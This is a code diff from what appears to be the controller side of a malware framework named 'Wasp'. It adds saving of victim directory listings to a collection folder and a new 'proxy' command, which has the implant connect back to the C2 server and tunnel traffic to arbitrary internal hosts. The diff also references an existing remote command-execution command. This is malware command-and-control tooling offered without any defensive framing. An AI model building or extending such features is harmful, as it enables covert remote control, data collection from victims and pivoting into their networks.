@@ -91,8 +91,13 @@ class WaspCommandFileList(WaspCommand):
     def handle_response(self, response: WaspResponse):
         listing_text: str = response.data.decode('utf-8')
         self.logger.info(f"\nIs File\tSize\tName\n{listing_text}")
-        
-             
+
+        date_stamp = self.generated_date.strftime("%Y%m%d_%H%M%S")
+        destination_directory = self.wasp.collection_directory / "directory_listings"
+        destination_directory.mkdir(parents=True, exist_ok=True)
+        destination = destination_directory / f"{date_stamp}-DirectoryListing-{self.command_id}.txt"
+        destination.write_bytes(response.data)
+
 
 @WaspCommandClass
 class WaspCommandExecute(WaspCommand):
@@ -126,3 +131,45 @@ class WaspCommandExecute(WaspCommand):
         self.logger.info(f"Command: {self.command}")
         self.logger.info(f"Result: {output}")
         return output
+
+@WaspCommandClass
+class WaspCommandProxy(WaspCommand):
+    """ This command connects to the C2 server on "reverse_port", then connects to
+    "destination_host" on "destination_port", and forwards data between the two.
+    When either socket closes, the tunnel is terminated.
+    """
+    name: str = "proxy"
+    logger: logging.Logger = logger.getChild("Proxy")
+
+    destination_host: str
+    destination_port: int
+
+    reverse_port: int
+
+    def __init__(self, wasp: WaspMalware, reverse_port: int, destination_host: str, destination_port: int):
+        super().__init__(wasp)
+        self.destination_host = destination_host
+        self.destination_port = destination_port
+        self.reverse_port = reverse_port
+
+    def get_dict(self) -> Dict:
+        return {
+            "uri": self.name,
+            "headers": {
+                "Reverse-Port": self.reverse_port,
+                "Dest-Host": self.destination_host,
+                "Dest-Port": self.destination_port,
+            }
+        }
+
+    @classmethod
+    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
+        destination_host: str = source["headers"]["Dest-Host"]
+        destination_port: int = source["headers"]["Dest-Port"]
+        reverse_port: int = source["headers"]["Reverse-Port"]
+        command: WaspCommand = cls(wasp, reverse_port, destination_host, destination_port)
+        return command
+
+    def handle_response(self, response: WaspResponse):
+        self.logger.info(f"Proxying {self.reverse_port} to {self.destination_host}:{self.destination_port}")
+
